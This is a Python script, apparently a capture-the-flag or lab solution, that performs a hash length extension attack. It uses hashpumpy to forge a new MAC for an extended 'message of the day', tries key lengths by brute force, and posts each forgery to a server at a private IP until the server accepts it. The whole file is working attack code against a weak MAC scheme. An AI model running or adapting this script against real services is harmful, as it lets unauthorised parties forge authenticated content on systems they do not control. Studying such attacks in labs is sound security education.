#! /usr/bin/env python3

import argparse
from hashpumpy import hashpump
import requests

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-s", "--secret",
        dest="secret",
        help="HMAC secret",
        default="69268ba87558295eedb751d8f4744b58bd2705ce5d09984f31927bb7fbfe9b97"
    )
    parser.add_argument(
        "-l", "--length",
        dest="length",
        help="Maximum key length to brute force",
        required=True
    )
    parser.add_argument(
        "-i", "--input",
        dest="input",
        help="Input file containing the original message of the day",
        default="motd.txt"
    )
    parser.add_argument(
        "-m", "--message",
        dest="message",
        help="New message of the day to be appended",
        required=True
    )
    parser.add_argument(
        "-url", "--url",
        dest="url",
        help="URL of the server to be brute-forced",
        default="http://10.0.23.61"
    )
    options = parser.parse_args()
    return options

if __name__ == "__main__":

    opts = get_arguments()

    # Get all arguments:
    hmac = opts.secret
    key_len = int(opts.length)
    with open(opts.input, "r") as old_file:
        old_motd = old_file.read()
    new_motd = opts.message
    url = opts.url

    # Start a session for the HTTP requests:
    session = requests.Session()

    # For each key length in the specified interval:
    for i in range(1, key_len + 1):

        # Update the HMAC with the new message assuming i is the key length:
        new_hmac, ext_motd = hashpump(hmac, old_motd, new_motd, i)

        # Submit the message (old message + padding + new message) and the new HMAC to the server:
        resp = session.post(url, data={"hmac":new_hmac}, files={"file":("motd.txt", ext_motd)})

        # If it succeeded, we got the key length right:
        if "Successfully changed message of the day!" in resp.text:

            print("Successfully appended message: " + new_motd)
            print("New HMAC: " + new_hmac)
            print("Key length: " + str(i))

            # Save the new HMAC to text file:
            with open("hmac.txt", "w") as new_file:
                new_file.write(new_hmac)

            # Save the extended message to text file:
            with open("ext_motd.txt", "wb") as new_file:
                new_file.write(ext_motd)

            quit()

    print("Brute force attack failed! Maybe try it again with a higher maximum length to be tested?")